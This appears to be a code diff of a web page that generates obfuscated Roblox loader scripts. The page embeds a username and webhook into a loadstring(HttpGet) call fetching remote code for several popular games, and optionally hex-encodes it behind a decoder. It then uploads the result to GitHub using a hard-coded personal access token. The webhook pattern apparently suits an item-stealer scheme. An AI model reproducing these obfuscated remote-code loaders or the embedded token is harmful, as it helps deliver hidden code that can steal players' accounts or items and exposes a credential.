@@ -1,4 +1,5 @@
-<!DOCTYPE html><html lang="en">
+<!DOCTYPE html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -65,79 +66,68 @@
         <button onclick="generateScript()">Generate Script</button>
     </div>
     <script>
-        const token = "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";let loadstrings = {
-        "Blox Fruits": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Bloxfruits'))()",
-        "Murder Mystery 2": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Void'))()",
-        "Adopt Me": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/AdoptMe'))()",
-        "Pet Simulator 99": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Ps99'))()",
-        "Pls Donate": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/PlsDonate'))()"
-    };
-
-    function hexEncode(script) {
-        return script.split('').map(c => `\z${c.charCodeAt(0).toString(16)}${Math.floor(Math.random() * 9)}`).join('');
-    }
-
-    function wrapInDecoder(hexString) {
-        return `loadstring((function(...)
-            local P = ''
-            local hex = '${hexString}'
-            for h in hex:gmatch('\\z(%x%x)%d') do
-                P = P .. string.char(tonumber(h, 16))
-            end
-            return P
-        end)())()`;
-    }
-
-    function obfuscateScript(script) {
-        let hex = hexEncode(script);
-        return wrapInDecoder(hex);
-    }
-
-    function generateScript() {
-        let username = document.getElementById('username').value;
-        let webhook = document.getElementById('webhook').value;
-        let selectedScript = document.getElementById('script-select').value;
-        let autoObfuscate = document.getElementById('auto-obfuscate-option').checked;
-
-        if (!username || !webhook) {
-            alert("Please enter both Username and Webhook URL!");
-            return;
+        const token = "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";
+        let loadstrings = {
+            "Blox Fruits": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/BloxFruits.txt'))()",
+            "Murder Mystery 2": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/MurderMystery2.txt'))()",
+            "Adopt Me": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/AdoptMe.txt'))()",
+            "Pet Simulator 99": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/PetSimulator99.txt'))()",
+            "Pls Donate": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/PlsDonate.txt'))()"
+        };
+        function hexEncode(script) {
+            return script.split('').map(c => `\z${c.charCodeAt(0).toString(16)}${Math.floor(Math.random() * 9)}`).join('');
         }
-
-        let script = `Username = "${username}"
-
-Webhook = "${webhook}" ${loadstrings[selectedScript]}`;
-
-if (autoObfuscate) {
-            script = obfuscateScript(script);
+        function wrapInDecoder(hexString) {
+            return `loadstring((function(...)
+                local P = ''
+                local hex = '${hexString}'
+                for h in hex:gmatch('\\z(%x%x)%d') do
+                    P = P .. string.char(tonumber(h, 16))
+                end
+                return P
+            end)())()`;
         }
-
-        uploadToGitHub(script, selectedScript);
-    }
-
-    function uploadToGitHub(content, scriptName) {
-        let filename = `Void${scriptName}.txt`;
-        fetch('https://api.github.com/repos/YourUsername/YourRepo/contents/' + filename, {
-            method: 'PUT',
-            headers: {
-                'Authorization': 'Bearer ' + token,
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                message: 'Add new script',
-                content: btoa(content)
+        function obfuscateScript(script) {
+            let hex = hexEncode(script);
+            return wrapInDecoder(hex);
+        }
+        function generateScript() {
+            let username = document.getElementById('username').value;
+            let webhook = document.getElementById('webhook').value;
+            let selectedScript = document.getElementById('script-select').value;
+            let autoObfuscate = document.getElementById('auto-obfuscate-option').checked;
+            if (!username || !webhook) {
+                alert("Please enter both Username and Webhook URL!");
+                return;
+            }
+            let script = `Username = "${username}"Webhook = "${webhook}" ${loadstrings[selectedScript]}`;
+            if (autoObfuscate) {
+                script = obfuscateScript(script);
+            }
+            uploadToGitHub(script, selectedScript);
+        }
+        function uploadToGitHub(content, scriptName) {
+            let filename = `Void${scriptName}.txt`;
+            fetch(`https://api.github.com/repos/Goldded/Void2/contents/${filename}`, {
+                method: 'PUT',
+                headers: {
+                    'Authorization': 'Bearer ' + token,
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    message: 'Add new script',
+                    content: btoa(content)
+                })
             })
-        })
-        .then(response => response.json())
-        .then(data => {
-            let rawURL = data.content.download_url;
-            let loadString = `loadstring(game:HttpGet('${rawURL}'))()`;
-            navigator.clipboard.writeText(loadString);
-            alert("Script uploaded and loadstring copied to clipboard!");
-        })
-        .catch(error => console.error('Error uploading:', error));
-    }
-</script>
-
+            .then(response => response.json())
+            .then(data => {
+                let rawURL = data.content.download_url;
+                let loadString = `loadstring(game:HttpGet('${rawURL}'))()`;
+                navigator.clipboard.writeText(loadString);
+                alert("Script uploaded and loadstring copied to clipboard!");
+            })
+            .catch(error => console.error('Error uploading:', error));
+        }
+    </script>
 </body>
 </html>
